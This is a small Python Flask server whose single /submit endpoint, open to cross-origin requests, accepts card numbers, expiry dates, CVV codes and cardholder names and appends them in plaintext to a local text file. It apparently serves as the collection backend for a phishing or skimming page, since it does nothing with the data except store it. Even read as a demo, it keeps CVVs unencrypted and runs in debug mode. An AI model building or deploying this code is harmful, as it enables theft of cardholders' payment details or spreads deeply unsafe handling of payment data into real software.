from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)


# Define the path to the file where the data will be saved
data_file = "card_info.txt"



@app.route('/submit', methods=['POST'])
def submit_data():
    # Get the data from the request
    data = request.get_json()
    
    # Extract credit card fields
    cardNumber = data.get('cardNumber')
    expiry    = data.get('expiry')
    cvv        = data.get('cvv')
    cardName   = data.get('cardName')
    
    # Validate that all fields exist and are not empty
    if cardNumber and expiry and cvv and cardName:
        # Append credit card info to data file
        with open(data_file, 'a') as file:
            file.write(
                f"Card Number: {cardNumber}, "
                f"Expiry: {expiry}, "
                f"CVV: {cvv}, "
                f"Card Name: {cardName}\n"
            )
        
        return jsonify({"message": "Data saved successfully"}), 200
    else:
        return jsonify({"message": "Invalid data"}), 400




if __name__ == '__main__':
   # Ensure the file exists or create it if necessary
   if not os.path.exists(data_file):
       with open(data_file, 'w') as f:
           pass  # Just create the file if it doesn't exist
   app.run(debug=True, port=8000)